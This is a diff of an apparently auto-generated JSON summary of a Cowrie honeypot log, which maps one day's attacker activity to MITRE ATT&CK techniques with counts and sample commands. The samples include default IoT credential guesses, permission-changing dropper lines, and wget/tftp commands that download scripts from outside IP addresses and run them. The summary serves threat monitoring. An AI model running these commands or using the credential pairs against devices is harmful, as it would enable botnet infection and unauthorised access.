@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-19 17:00:53",
+  "generated": "2026-08-19 18:01:45",
   "totals": {
-    "commands": 4784,
-    "login_failed": 4048,
-    "login_success": 1531,
-    "sessions": 4298
+    "commands": 5149,
+    "login_failed": 4122,
+    "login_success": 1547,
+    "sessions": 4348
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 4048,
+      "count": 4122,
       "examples": [
         "root / vizxv",
         "root / 19801021",
@@ -21,14 +21,14 @@
         "root / 19820308"
       ],
       "first": "2026-08-19T00:00:00.138204Z",
-      "last": "2026-08-19T17:00:01.611062Z",
-      "unique_ips": 82
+      "last": "2026-08-19T18:01:30.819098Z",
+      "unique_ips": 92
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 1531,
+      "count": 1547,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "hikvision / hikvision",
@@ -37,14 +37,14 @@
         "telnetadmin / telnetadmin"
       ],
       "first": "2026-08-19T00:00:00.538972Z",
-      "last": "2026-08-19T16:49:01.477804Z",
-      "unique_ips": 60
+      "last": "2026-08-19T17:55:48.735661Z",
+      "unique_ips": 65
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 132,
+      "count": 159,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -53,14 +53,14 @@
         ">/dev/d && chmod 777 /dev/d && /dev/d && cd /dev/"
       ],
       "first": "2026-08-19T00:55:54.512846Z",
-      "last": "2026-08-19T16:49:03.539410Z",
-      "unique_ips": 13
+      "last": "2026-08-19T17:57:36.222047Z",
+      "unique_ips": 15
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 92,
+      "count": 96,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "http://185.93.89.72/wget",
@@ -69,36 +69,37 @@
         "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t"
       ],
       "first": "2026-08-19T00:55:56.123389Z",
-      "last": "2026-08-19T16:25:40.020460Z",
-      "unique_ips": 13
+      "last": "2026-08-19T17:57:36.222047Z",
+      "unique_ips": 14
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 16,
+      "count": 17,
       "examples": [
         "uname -a",
         "uname -s -v -n -r -m",
         "cat /proc/cpuinfo",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "uname -s -m"
       ],
       "first": "2026-08-19T01:22:46.787305Z",
-      "last": "2026-08-19T16:49:03.539410Z",
-      "unique_ips": 11
+      "last": "2026-08-19T17:01:55.597319Z",
+      "unique_ips": 12
     },
     {
       "id": "T1033",
       "name": "System Owner/User Discovery",
       "tactic": "Discovery",
-      "count": 8,
+      "count": 9,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
       ],
       "first": "2026-08-19T00:55:56.123389Z",
-      "last": "2026-08-19T16:49:03.539410Z",
-      "unique_ips": 8
+      "last": "2026-08-19T17:55:52.924500Z",
+      "unique_ips": 9
     },
     {
       "id": "T1059.004",
@@ -180,19 +181,27 @@
   "unmapped": [
     [
       "shell",
-      1484
+      1498
     ],
     [
       "sh",
-      1484
+      1497
     ],
     [
       "system",
-      1467
+      1480
     ],
     [
       "/bin/busybox",
-      43
+      116
+    ],
+    [
+      "enable",
+      28
+    ],
+    [
+      "linuxshell",
+      27
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
@@ -203,60 +212,52 @@
       16
     ],
     [
-      "enable",
+      "cd /proc && cat self/cmdline",
       15
     ],
     [
-      "linuxshell",
-      14
-    ],
-    [
-      "cd /proc && cat self/cmdline",
-      14
-    ],
-    [
       "ping ;sh",
-      12
+      13
     ],
     [
       "enablelinuxshell",
-      11
+      12
     ],
     [
-      "busybox",
-      5
+      ">/tmp/.codi && cd /tmp/",
+      12
     ],
     [
-      "RPMA",
-      3
+      ">/var/.codi && cd /var/",
+      12
     ],
     [
-      "AMOO",
-      3
+      ">/dev/.codi && cd /dev/",
+      12
     ],
     [
-      "/ip cloud print",
-      2
+      ">/mnt/.codi && cd /mnt/",
+      12
     ],
     [
-      "locate D877F783D5D3EF8Cs",
-      2
+      ">/var/run/.codi && cd /var/run/",
+      12
     ],
     [
-      "echo Hi | cat -n",
-      2
+      ">/var/tmp/.codi && cd /var/tmp/",
+      12
     ],
     [
-      "exit",
-      2
+      ">/.codi && cd /",
+      12
     ],
     [
-      "/bin/busybox UNSTABLE",
-      2
+      ">/dev/netslink/.codi && cd /dev/netslink/",
+      12
     ],
     [
-      "echo xsec",
-      2
+      ">/dev/shm/.codi && cd /dev/shm/",
+      12
     ]
   ]
 }
